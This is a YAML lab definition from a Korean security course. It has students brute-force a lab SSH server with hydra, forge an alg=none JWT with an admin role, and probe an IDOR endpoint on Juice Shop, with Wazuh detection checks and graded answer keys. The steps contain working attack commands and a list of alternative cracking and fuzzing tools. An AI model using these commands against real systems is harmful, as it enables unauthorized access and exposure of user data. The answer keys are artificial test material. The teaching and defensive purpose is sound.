lab_id: standalone-attack-week06
title: 인증·접근제어 — hydra brute / JWT 변조 / IDOR
version: standalone-non-ai
course: attack
week: 6
description: |
  OWASP A01 (Broken Access Control) + A07 (Auth Failures). hydra SSH brute / JWT
  alg=none 변조 / IDOR 시퀀스 시도.
difficulty: medium
duration_minutes: 150
prerequisites: [W05]
objectives:
  - "hydra SSH brute (제한 wordlist)"
  - "JWT alg=none 우회 시뮬"
  - "IDOR /api/Users/N 시퀀스"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## Mission
      attacker 에서 hydra 로 bastion (10.20.30.201) 의 SSH 인증 brute force 를 *제한
      wordlist* (user 3 + password 5 = 15 시도) 로 시연하라. 본 step 은 *OWASP A07*
      Authentication Failures + *MITRE T1110.001* Password Guessing. 학생은 *hydra 의
      5 옵션* + *thread/timeout 의 detection 회피* + *Wazuh 5710 (sshd: authentication failed)
      + 5712 (Multiple authentication failures) 의 자동 차단* 3 핵심 인지.

      ## hydra 의 5 핵심 옵션 (외워야 함)
      | 옵션 | 의미 |
      |------|------|
      | `-L file` | username list |
      | `-P file` | password list |
      | `-t N` | thread 수 (1=stealth, 16=빠름. 본 step 1) |
      | `-f` | 첫 성공 후 즉시 종료 (다른 user 시도 skip) |
      | `-e nsr` | n=null pwd, s=same as user, r=reverse |

      ## 학습 환경의 정답 (예상)
      - bastion 컨테이너의 ccc 사용자 패스워드 = `ccc` (혹은 `1`)
      - hydra 가 ccc:ccc 매치 → 즉시 종료 (-f)

      ## 실행 절차
      1. **user/password wordlist 작성** — 학습용 최소 (15 시도)
      2. **hydra SSH brute** — 20 초 timeout (실패 안전성)
      3. **결과 분석** — 성공 / 실패 분류 + Wazuh 차단 카운트

      ## 실행 명령
      ```bash
      ssh 6v6-attacker '
        # 정답 (ccc:ccc) 을 *마지막* 에 두어 실패 시도 14 회 발생 → Wazuh detection 확인
        echo -e "root\nadmin\nccc" > /tmp/u.txt
        echo -e "password\nadmin\n1\nletmein\nccc" > /tmp/p.txt
        echo "=== hydra SSH brute (14 fail + 1 success, -t 4 병렬) ==="
        timeout 60 hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 -f 10.20.30.201 ssh 2>&1 | tail -10
        echo
        echo "=== Wazuh 5710/5712 카운트 (오늘) ==="
        # 6v6 인프라 결함: bastion 컨테이너 의 SSH 로그가 Wazuh 미연동 시 카운트 0 가능
        # 조건부 학습 — siem 에 alert 가 있을 때만 검증 의미
        TODAY=$(date +%Y/%b/%d)
        ssh 6v6-siem "sudo grep -cE \"5710|5712\" /var/ossec/logs/alerts/alerts.json 2>/dev/null || echo 0"
        echo "(0 인 경우 — bastion 의 SSH 로그 → Wazuh 연동 결함. /var/log/auth.log 직접 확인:)"
        ssh 6v6-bastion "sudo tail -10 /var/log/auth.log | grep -iE \"failed|invalid\" | wc -l" 2>/dev/null || echo "  (auth.log 접근 불가)"
      '
      ```

      ## 성공 판정
      - hydra 실행 + 인증 시도 출력 (`login: ... password: ...`)
      - 학습 환경 정답 (ccc:ccc 또는 ccc:1) 매치 시 *success* 출력
      - Wazuh 5710/5712 카운트 1 이상 (SSH 인증 실패 detection)
      - W09 의 Wazuh active-response 학습 연결 인지

      ## 비정상 시 대응
      - **모든 시도 fail (success 0)** — bastion 비밀번호 가 학습 default 와 다름. `docker exec 6v6-bastion bash -c 'cat /etc/passwd | grep ccc'` 로 사용자 확인
      - **Connection refused** — bastion SSH 22 차단. step 1 의 nmap 재확인
      - **Wazuh 카운트 0 — 가장 흔함 (인프라 결함)** —
        bastion 컨테이너에 Wazuh agent 가 미설치 / rsyslog forward 미연동 인 경우.
        ① `ssh 6v6-siem 'sudo ls -la /var/ossec/etc/client.keys'` 로 등록된 agent 확인 →
        bastion (10.20.30.200) 미등록 시 결함 확정.
        ② 정정 — siem 에서 `sudo /var/ossec/bin/manage_agents -a -n bastion -i 10.20.30.200`
        → bastion 에서 wazuh-agent 설치 + `manage_agents -i <key>` 로 등록 → systemctl
        restart wazuh-agent → 재 brute → alerts.json 검증.
        ③ 시간 압박 시 fallback — `python3 scripts/lab_fixture_inject.py --lab
        contents/standalone/lab/attack/week06.yaml --order 1 --ssh` (wazuh_alert
        generator 가 brute_force_burst=true 로 5710/5712 합성 주입).
        ④ ②/③ 진행 후 W09 의 active-response 학습 으로 연결.
      - **hydra timeout 직전 종료** — `-t 2` 또는 `-w 5` (대기 시간) 로 보강

      ## 안내 — 공격 lab 의 *탐지 데이터* 정책 (시리즈 공통)
      *공격을 했는데 SIEM 데이터가 없으면* 그 lab 의 학습 가치 가 절반. 이 경우
      반드시 (a) 탐지 규칙 (Wazuh rule / Suricata rule / ModSec rule) 또는 (b)
      탐지 agent 부재 의 *둘 중 어느 쪽인지* 확인하고 정정 후 *재시도*. fixture
      는 *시간 압박 시 fallback* 일 뿐, 표준 절차는 *실 탐지 복구*.

      ## 학습 — W09 의 Wazuh Active Response
      ```
      <command name="firewall-drop">
        <executable>firewall-drop</executable>
        <expect>srcip</expect>
        <timeout_allowed>yes</timeout_allowed>
      </command>
      ```
      → 5710/5712 발동 시 자동 iptables drop. hydra 가 *몇 회 시도 후 차단됨*.

    fixtures:
      - generator: wazuh_alert
        target_vm: siem
        path: /var/ossec/logs/alerts/alerts.json
        params:
          seed: 42
          duration_days: 1
          alerts_per_day: 30
          brute_force_burst: true
        mode: append
        cleanup: false
        fallback_only: true
    hint: |
      hydra -L (user) -P (pwd) -t 1 -f -- SSH 표준. timeout 20 안전. Wazuh 5710/5712
      카운트로 detection 검증. -t 1 = stealth. *agent 미연동 인 경우* fixture
      fallback (위 fixtures.fallback_only) 활용.

    category: exploit
    points: 20
    answer: |
      ssh 6v6-attacker '
        echo -e "root\nadmin\nccc" > /tmp/u.txt
        echo -e "password\nadmin\n1\nletmein\nccc" > /tmp/p.txt
        timeout 30 hydra -L /tmp/u.txt -P /tmp/p.txt -t 1 -f 10.20.30.201 ssh 2>&1 | tail -10
      '
      ssh 6v6-siem 'sudo grep -cE "5710|5712" /var/ossec/logs/alerts/alerts.json 2>/dev/null || echo 0'
    answer_detail: |
      hydra 15 시도 + Wazuh detection. 정답 ccc:ccc 또는 ccc:1 매치 가능. Wazuh
      5710/5712 카운트 ≥ 1 (인증 실패 자동 탐지). W09 의 active-response 연결.
    verify:
      type: output_contains
      expect: 'hydra\|password\|valid'
      field: stdout
      semantic:
        intent: |
          hydra SSH brute force 15 시도 + Wazuh 5710/5712 detection 카운트. OWASP
          A07 + MITRE T1110.001. W09 의 Wazuh active-response 자동 차단 연결.
        success_criteria:
          - "hydra 실행 + 인증 시도 출력 (login/password 라인)"
          - "정답 매치 시 success 표시 (ccc:ccc 등)"
          - "Wazuh 5710/5712 카운트 1 이상"
          - "W09 의 active-response 연결 인지"
          - "-t 1 -f 의 stealth 의미 인지"
        acceptable_methods:
          - "hydra -L -P SSH (수기): 명령 `hydra -L u.txt -P p.txt -t 1 -f IP ssh`. 표준."
          - "medusa (대안): 명령 `medusa -h IP -U u.txt -P p.txt -M ssh`. multi-thread parallel."
          - "patator (Python): 명령 `patator ssh_login host=IP user=FILE0 password=FILE1 0=u.txt 1=p.txt`."
          - "ncrack: 명령 `ncrack -U u.txt -P p.txt ssh://IP:22`."
          - "hashcat -m 0 (해시 brute, offline): /etc/shadow 추출 후."
          - "john --rules (mutation): john --rules --wordlist=p.txt unshadow.out."
          - "Wazuh 5710 (1 회 실패) + 5712 (다중 실패) detection rules."
          - "Bastion AI brute + KG: bastion 이 (1) hydra (2) Wazuh 카운트 (3) success 시 finding anchor."
        negative_signs:
          - "hydra 실행만 하고 Wazuh detection 안 봄"
          - "정답 매치 받고 *학습 환경* 의미 인지 못함"
          - "Wazuh 5710 vs 5712 차이 모름"
          - "W09 의 active-response 연결 인지 못함"
          - "-t 1 의 stealth (vs -t 16 brute) 의미 모름"
    target_vm: attacker

  - order: 2
    instruction: |
      ## Mission
      W03 step 2 의 JWT 디코드 학습을 *공격 시연* 으로 진화시켜라:
      (1) **JWT alg=none 변조** payload 작성 + (2) **IDOR** `/api/Users/N` 5 시퀀스로
      *인증 없이 사용자 데이터 노출* 검증. 본 step 은 *OWASP A01 (Broken Access Control)*
      + *MITRE T1078 (Valid Accounts)* + *CWE-639 (Authorization Bypass)* 의 통합 시연.
      학생은 *alg=none 우회 원리* + *IDOR 의 정의* + *prevention (alg whitelist + 권한 검증)*
      3 핵심 인지.

      ## JWT alg=none 우회 원리 (외워야 함)
      ```
      정상:  header={"alg":"HS256",...}  → 서명 HMAC-SHA256 검증
      변조:  header={"alg":"none",...}   → 서명 검증 SKIP (취약 라이브러리)
              + payload 자유 변조 가능 (admin role 으로)
              + signature 빈 문자열 (.) — 검증 불필요
      방어:  alg whitelist (HS256, RS256 만 허용. none 거부)
      ```

      → 본 step 의 변조 JWT 형식: `<base64url header>.<base64url payload>.` (signature 빈 칸)

      ## IDOR (Insecure Direct Object Reference) 의 의미
      | 정의 | 의도 |
      |------|------|
      | URL 의 *object ID* 를 변경하면 다른 사용자 의 데이터 노출 | `/api/Users/1` → `/api/Users/2` 시도 |
      | 권한 검증 없이 ID 만 받음 | `/api/Cards/<other_user_id>` |
      | 5 시퀀스 (1~5) → 모두 200 = *권한 검증 부재* | A01 핵심 |

      ## 실행 명령
      ```bash
      # (1) JWT alg=none 변조 (base64url 인코딩)
      H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr "+/" "-_" | tr -d "=")
      P=$(echo -n '{"user":"admin","role":"admin"}' | base64 -w0 | tr "+/" "-_" | tr -d "=")
      FAKE_JWT="$H.$P."
      echo "=== 변조 JWT (alg=none) ==="
      echo "$FAKE_JWT"
      echo "  header decoded: $(echo $H | base64 -d 2>/dev/null)"
      echo "  payload decoded: $(echo $P | base64 -d 2>/dev/null)"
      echo

      # (2) IDOR — /api/Users/1~5 시퀀스
      echo "=== IDOR /api/Users/N (1~5) ==="
      ssh 6v6-attacker "
        for id in 1 2 3 4 5; do
          code=\$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' \
                       \"http://10.20.30.1/api/Users/\$id\")
          name=\$(curl -s -H 'Host: juice.6v6.lab' \"http://10.20.30.1/api/Users/\$id\" \
                  | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d.get(\"data\",{}).get(\"email\",\"?\"))' 2>/dev/null || echo '?')
          echo \"  User \$id: \$code  (\$name)\"
        done
      "
      ```

      ## 성공 판정
      - 변조 JWT 의 *3 부분* (`H.P.`) 형식 — signature 빈 칸 명시
      - header 의 alg=none + payload 의 admin role *디코드 검증*
      - IDOR 5 시도 *모두 200* 또는 *모두 401* (둘 다 학습 가치 — 200 시 IDOR / 401 시 prevention)
      - 200 발생 시 *email/name 추출* — *다른 사용자 데이터 노출* 확인
      - prevention 인지 — alg whitelist + 권한 검증

      ## 비정상 시 대응
      - **base64 인코딩 다름** — `base64 -w0` 의 -w0 (wrap 0) 누락 시 줄바꿈 발생
      - **IDOR 모두 401** — JuiceShop 의 *수정된 버전* 으로 IDOR 막힘 (학습 의도 조정 필요)
      - **모두 404** — `/api/Users/N` 경로 다름. `/api/Users` (전체) 로 endpoint 확인
      - **모두 500** — DB error. juiceshop 컨테이너 재시작 필요

      ## 학습 — W12 의 sqlmap --auth-cred / Burp JWT 자동화
      ```
      # Burp 의 JSON Web Token 확장 — 자동 alg=none / HS256 brute / kid injection
      # 또는 jwt_tool $JWT --mode=playbook
      ```

    hint: |
      base64 -w0 + tr 로 base64url. signature 빈 칸 명시. IDOR 200 = 취약, 401 =
      prevention 적용. JSON parse 로 email/name 추출 시 IDOR 영향 명시.

    category: exploit
    points: 25
    answer: |
      H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr "+/" "-_" | tr -d "=")
      P=$(echo -n '{"user":"admin","role":"admin"}' | base64 -w0 | tr "+/" "-_" | tr -d "=")
      echo "변조 JWT: $H.$P."
      ssh 6v6-attacker "for id in 1 2 3 4 5; do code=\$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' http://10.20.30.1/api/Users/\$id); echo \"User \$id: \$code\"; done"
    answer_detail: |
      JWT alg=none 변조 (H.P. 형식) + IDOR 5 시퀀스. 200 = 취약 (권한 검증 부재) /
      401 = prevention. 200 시 email 노출 확인. A01 + T1078.
    verify:
      type: output_contains
      expect: 'User\|alg\|none'
      field: stdout
      semantic:
        intent: |
          JWT alg=none 변조 payload 작성 + IDOR /api/Users/1~5 시퀀스. OWASP A01 +
          MITRE T1078 + CWE-639. 변조 원리 (signature 검증 skip) + IDOR 정의
          (object ID 자유 변경) + prevention (alg whitelist + 권한 검증) 3 인지.
        success_criteria:
          - "변조 JWT 의 H.P. 형식 (signature 빈 칸)"
          - "header alg=none + payload admin role 디코드"
          - "IDOR 5 응답 코드 매트릭스"
          - "200 시 다른 사용자 데이터 (email) 노출 확인"
          - "alg whitelist + 권한 검증 prevention 인지"
        acceptable_methods:
          - "base64 + tr (수기 base64url): 명령 `base64 -w0 | tr '+/' '-_' | tr -d '='`. JWT 표준."
          - "jwt_tool (자동화): 명령 `jwt_tool $JWT -X a` (alg=none). HS256 brute + kid inject + RS-to-HS."
          - "Burp JSON Web Token 확장: 자동 alg=none + HS256 brute."
          - "Python PyJWT: `jwt.encode(payload, '', algorithm='none')`."
          - "/api/Users/N IDOR (수기): for loop curl 5 회."
          - "ffuf + range: `ffuf -u http://.../api/Users/FUZZ -w <(seq 1 100)`. ID 범위 fuzzing."
          - "Burp Intruder + payload list (1~100)."
          - "Bastion AI 자동 JWT + IDOR: bastion 이 (1) JWT 변조 (2) IDOR sequence (3) 200 발생 시 finding + email 추출 → KG anchor."
        negative_signs:
          - "JWT 변조 안 하고 IDOR 만"
          - "IDOR 응답 코드만 보고 *데이터 노출* 확인 안 함"
          - "alg=none 의 *원리* 모름"
          - "prevention (alg whitelist) 인지 못함"
          - "*OWASP A01* + *CWE-639* 매핑 누락"
    target_vm: attacker
